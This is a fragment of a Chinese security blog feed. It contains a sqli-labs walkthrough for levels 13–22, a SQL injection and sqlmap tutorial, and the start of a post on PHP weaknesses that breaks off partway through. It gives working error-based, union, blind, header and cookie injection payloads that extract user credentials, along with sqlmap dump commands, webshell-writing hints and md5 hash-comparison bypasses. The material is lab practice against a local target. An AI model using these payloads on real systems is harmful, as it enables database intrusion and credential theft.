title="less13"></a>less13</h2><p><strong>手动</strong></p><p>发现用‘)闭合之后没有显示位，那就试试报错注入</p><p>尝试使用extractvalue()函数</p><p>直接extractvalue(1，database())好像有点问题，查略一番资料后发现加个concat就正常了</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;1&#39;) and extractvalue(1,concat(1,database()))#username&#x3D;1&#39;) and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)))#username&#x3D;1&#39;) and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)))#username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200352121.png" alt="image-20210208200352121"></p><p><strong>sqlmap</strong></p><p>因为之前已经抓过包,post请求应该是一样的,所以和命令和第十一题是一样</p><h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>和上一题一样，只是闭合变成了“</p><h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>手动</strong></p><p>这题不能用报错注入，试试其他的吧</p><p>先试试数据库的长度</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200413051.png" alt="image-20210208200413051"></p><p>依旧使用left函数来判断</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200429516.png" alt="image-20210208200429516"></p><p>然后就是一个一个去试啦，也可以借助一些脚本，或者是burpsuite</p><p><strong>sqlmap</strong></p><p>然它自己去测吧，从结果来看，可以指定使用布尔盲注或者是时间盲注，这样子跑的会快一些</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-15&#x2F; --data &quot;uname&#x3D;admin &amp;passwd&#x3D;admin &amp;submit&#x3D;Submit&quot; --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><p>和15题一样，只是闭合变成了”）</p><p>sqlmap的话用上面的跑不出了，在网上查到sqlmap默认的输出等级是1，这里把输出等级调高一点就好了</p><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><p><strong>手动</strong></p><p>这一关开始看着有点懵，提示要重置密码</p><p>查看post内容，发现是在passwd处</p><p>我的理解是接收到用户POST提交的uname和passwd后，根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p><p>所以注入的时候要在这里，用户名的话就用admin吧</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200502414.png" alt="image-20210208200502414"></p><p>需要用到的是updatexml函数</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&amp;passwd&#x3D;123123&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1)),1)#&amp;sumit&#x3D;Submit接下来的和前面差不多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level&#x3D;4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><strong>手动</strong></p><p>登录失败只会显示ip地址,登录成功会显示user agent</p><p>随后发现username和password都被转义了,构造不了闭合条件</p><p>猜测可能可以通过user agent来注入,看了下源码,确实如此</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200520106.png" alt="image-20210208200520106"></p><p>谷歌的hackbar不知道为什么有点问题</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200534798.png" alt="image-20210208200534798"></p><p>直接用burpsuite试试</p><p>payload为</p><pre class="line-numbers language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(database())),1) or &#39;1&#39; &#x3D; &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经爆出来了,接下来就是常规操作啦</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200642152.png" alt="image-20210208200642152"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level&#x3D;4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>手动</strong></p><p>输入正确会显示Referer,错误没有显示,这题基本上就是Referer这里存在注入</p><p>和18题一样,只是注入点不一样,用上一题的payload就行了</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200709726.png" alt="image-20210208200709726"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level&#x3D;4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>手动</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200722575.png" alt="image-20210208200722575"></p><p>基本上就是cookie注入了</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200801021.png" alt="image-20210208200801021"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200817248.png" alt="image-20210208200817248"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-20&#x2F;&quot; --cookie&#x3D;&quot;uname&#x3D;admin*&quot;--dbms&#x3D;MySQL --random-agent --flush-session --technique&#x3D;B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h2><p><strong>手动</strong></p><p>这题和上一题一样,就是把payload用base64编码了</p><p>把上一题的payload base64编码一下就是这题的payload了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname&#x3D;YWRtaW4%3D --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><p><strong>手动</strong></p><p>和上一题的一样,就是把闭合方式改成了双引号</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname&#x3D;YWRtaW4&#x3D; --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入原理及sqlmap的使用</title>
      <link href="2020/lou-dong/sql-zhu-ru/"/>
      <url>2020/lou-dong/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>mysql数据库刚刚学完,学的都是开发用到的建表,增删查改,存储过程之类的知识</p><p>现在来学习学习sql注入.</p><p>sql注入也是基于基础的sql语句来实现对数据库系统的恶意操做的</p><h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><p>首先是<strong>sql注入要满足的条件及原理</strong>:</p><p>1.参数可控:就是可以自定义传入的参数</p><p>2.参数要可以带到数据库查询:传入的参数所拼接成的sql语句,必须带入数据库查询</p><p>在做数据库实验的过程中也发现mysql会有个默认的information_schema数据库,里面有好多好东西啊,在一些表里面可以看到所有的数据库名,表名,还有其他一些数据库的信息。</p><p>还有一些有用的函数,可以查看数据库的基本信息,都用得到</p><pre class="line-numbers language-none"><code class="language-none">@@datadir: 查询数据库的物理路径@@version: 查询数据库版本version(): database(): 查看数据库名user(): 查看mysql用户limit m,n: 从m条记录开始取n条记录......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造闭合语句"><a href="#构造闭合语句" class="headerlink" title="构造闭合语句"></a>构造闭合语句</h3><p>sql注入需要将前面的语句闭合起来或者是形成自己的sql语句,可以有一下几种方式:</p><p>‘ (单引号)可以把id括起来，使前面的语句闭合</p><p>构造语句的时候，一是要把我们构造的语句释放出来，二是要把结构进行补全或者适当的注释。</p><p>注释可以用–+;– -;#把后面的’或者多余的修饰符注释掉，当然不同数据库的注释方法也不尽相同。</p><p>/<em>!</em>/ (内联注释可以放在整个sql语句中)</p><p>下面是一些常用的结构</p><pre class="line-numbers language-none"><code class="language-none">or 1&#x3D;1--+ &#39;or 1&#x3D;1--+ &quot;or 1&#x3D;1--+ )or 1&#x3D;1--+ &#39;)or 1&#x3D;1--+ &quot;) or 1&#x3D;1--+ &quot;))or 1&#x3D;1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h3><h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>感觉思路是比较清晰的，一步一步的扩大对数据库的查询范围，最后获取到有用信息。就是order by查字段有点烦</p><p>一般的union注入感觉都可以安装这个步骤来：</p><p>1.先找到闭合规则</p><p>2.然后用order by子句查询属性列的字段数,也就是看有多少列</p><p>3.接着就可以获取database()了，先把id换成-1，数据库没有id=-1的数据，这样就可以把所有select起来的数据都显示出来</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到当前的数据库是security</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201220521.png" alt="image-20210208201220521"></p><p>4.查表名</p><p>因为当时union select出来的数据显示2，3</p><p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D;&#39;security&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.查用户属性也就是字段</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name &#x3D; &#39;users&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以发现有三个属性</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201234242.png" alt="image-20210208201234242"></p><p>6.查完属性就可以查列了，把username全部调出来</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201319502.png" alt="image-20210208201319502"></p><p>7.最后就是查用户密码了</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p><p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p><p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201358085.png" alt="image-20210208201358085"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1 and 1&#x3D;1 --+ 正常http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1 and 1&#x3D;2 --+ 正常http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1&#39; and 1&#x3D;2 --+ 不正常http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1&#39; and 1&#x3D;1 --+ 正常综上可以判断是字符串盲注了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.根据返回状态判断闭合规则</p><p>3.<strong>经常用到的就是length()和substr()语句，来猜数据库、表名等的长度和正确字母；</strong></p><pre class="line-numbers language-none"><code class="language-none">length()：返回字符串的长度substr(str,pos,num) ：截取指定位置指定长度的字符串mid(str,pos,num) :截取指定位置指定长度的字符串ascii() 查询ascii码中对应的值char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ol><li><p>只要注入点有sql报错信息，就可以使用报错注入；</p></li><li><p>还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；</p></li><li><p>updatexml报错获取当前数据库：</p><pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>floor报错获取当前数据库：</p><pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>两种方式应该都可行，如果第一个不行就换第二个试试</p></li><li><p>接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；</p></li><li><p>注意这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；</p></li></ol><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ol><li><p>没有明确的现象，不管是对是错都返回一个状态；</p></li><li><p>但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；</p></li><li><p>我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；</p></li><li><p>同样的找到正确的闭合规则，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；</p></li><li><p>时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；</p></li><li><p>那么判断当前数据库名的长度的语句为：</p><pre class="line-numbers language-none"><code class="language-none">if (length(database())&gt;1,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是没有延时)，由此来推出数据库长度。</p></li><li><p>判断当前数据库名的第一个和第二个字母的语句：</p><pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)&#x3D;&#39;s&#39;,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p></li><li><p>根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p></li></ol><h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><ol><li><p>可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；</p></li><li><p>同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；</p></li><li><p>堆叠注入的语句为</p><pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p></li></ol><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><ol><li>二次注入一共有两个url，一个url用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</li><li>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</li><li>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</li><li>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</li><li>后面就是union注入攻击的常规操作。</li></ol><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><ol><li>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；</li><li>一般情况下，此处就不存在sql注入漏洞的；</li><li>但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</li><li>宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</li><li>因此构造闭合规则时，在单引号前面加上 %df 就行了；</li><li>之后在闭合规则中写入同union注入的一些查询语句就行了；</li></ol><h4 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h4><p>首先base64是什么?</p><p>Base64是网络上最常见的用于传输8Bit<a href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683">字节码</a>的编码方式之一，Base64就是一种基于64个可打印字符来表示<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457">二进制</a>数据的方法。Base64编码是从二进制到字符的过程，可用于在<a href="https://baike.baidu.com/item/HTTP">HTTP</a>环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。</p><ol><li>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</li><li>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</li><li>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</li></ol><h4 id="http请求头—cooki注入"><a href="#http请求头—cooki注入" class="headerlink" title="http请求头—cooki注入"></a>http请求头—cooki注入</h4><ol><li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p></li><li><p>常见的http头部注入的参数有：</p><pre class="line-numbers language-none"><code class="language-none">【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p></li><li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p></li></ol><h4 id="http请求头—XFF注入"><a href="#http请求头—XFF注入" class="headerlink" title="http请求头—XFF注入"></a>http请求头—XFF注入</h4><ol><li>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</li><li>例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；</li><li>之后使用union注入的方法完成即可。</li></ol><h4 id="知道绝对路径的注入"><a href="#知道绝对路径的注入" class="headerlink" title="知道绝对路径的注入"></a>知道绝对路径的注入</h4><ol><li>如果知道了网站的根目录，并且知道此站点存在sql注入；</li><li>猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用蚁剑连接；</li><li>如果数据库没有file权限，就用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；</li><li>如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；</li><li>如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。</li></ol><h3 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h3><p>sqlmap支持一下五种注入：</p><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>联合查询注入，可以使用union的情况下的注入。</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><p>下面有简要的操作概述</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201453846.png" alt="image-20210208201453846"></p><p>命令太多了，还不太熟练，目前只会用一点</p><p>一些基本命令</p><h4 id="1-输出等级-V"><a href="#1-输出等级-V" class="headerlink" title="1.输出等级 V"></a>1.输出等级 V</h4><p><code>V</code> 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p><p>默认是 1，也可以在命令后指定 <code>-v 3</code> 就是等级 3 的输出。</p><pre class="line-numbers language-none"><code class="language-none">0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；2：同时显示调试信息 [DEBUG]；3：同时显示注入使用的攻击荷载；4：同时显示 HTTP 请求；5：同时显示 HTTP 响应头；6：同时显示 HTTP 响应体。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2.指定目标 U"></a>2.指定目标 <code>U</code></h4><p>使用参数 <code>-u</code> 或 <code>–url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u &quot;www.baidu.com&#x2F;user.php?id&#x3D;7&quot;sqlmap.py -url &quot;www.baidu.com:8080&#x2F;user.php?id&#x3D;7&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p><h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p><h4 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 <code>columns</code></h4><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 <code>-D ‘库名’ -T ‘表名’ --columns</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201601814.png" alt="image-20210208201601814"></p><p>这些只是一些枚举常用的，更多用法慢慢解锁吧</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉对于一些注入了解的还是不够深，有时候碰到新题自己试了各种方法总是要很久才做的出来。</p><p>也可能是我数据库学的不怎么样，如果对数据库越熟悉的话做题起来应该会如鱼得水。</p><p>自己目前也只是学了一个mysql，打算有空看看其他的数据库。</p><p>其次sqlmap也还是用的不熟练，还是需要多去刷题多练练啊。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常见漏洞</title>
      <link href="2020/lou-dong/php-chang-jian-lou-dong/"/>
      <url>2020/lou-dong/php-chang-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>PHP中有四个执行系统外部命令的方法</p><pre class="line-numbers language-none"><code class="language-none">exec()shell_exec()system()passthru()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h2><pre class="line-numbers language-none"><code class="language-none">$_POST &#x2F;&#x2F; 获取 post 数据，是一个字典$_GET &#x2F;&#x2F; 获取 get 数据，是一个字典$_COOKIE &#x2F;&#x2F; 获取 cookie$_SESSION &#x2F;&#x2F; 获取 session$_FILE &#x2F;&#x2F; 获取上传的文件$_REQUEST &#x2F;&#x2F; 获取 $_GET，$_POST，$_COOKIE 中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h2><p>PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p><h2 id="弱类型漏洞"><a href="#弱类型漏洞" class="headerlink" title="弱类型漏洞"></a>弱类型漏洞</h2><p>PHP是弱类型语言，不须要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不一样表达式所须要的类型自动转换，好比求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另一种类型都有固定的规则，当某个操做发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。</p><h3 id="和-的区别"><a href="#和-的区别" class="headerlink" title="==和===的区别"></a>==和===的区别</h3><pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x3D;  会在比较的时候装化成相同的类型&#x3D;&#x3D;&#x3D; 先判断左右两者类型是否相等之后再作比较（这个更严格一些）整数和字符串进行比较的时候，字符串数字后的内容会被省略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当某些语句的判断条件是使用 “ == ”来判断时，就可以使用弱类型来替代。如果遇到了 “===” 则不会进行类型转换，但也并不代表无从下手。如果条件表达式中含有函数，也可以通过传入数组让函数返回 NULL 使得条件满足。</p><h3 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h3><p>当数组(array)与任何非数组进行比较时，数组老是最大的</p><h3 id="bool类型比较"><a href="#bool类型比较" class="headerlink" title="bool类型比较"></a>bool类型比较</h3><p>bool类型的true跟任意字符能够弱类型相等</p><h3 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h3><p>1.md5()绕过<code>==</code></p><p> PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">//bool(false)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面两个值可以使md5()的开头为0e，经过<code>==</code>弱类型比较可输出‘yes’，但没法经过<code>===</code></p><p>经常使用md5()开头为“0e”的字符：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span 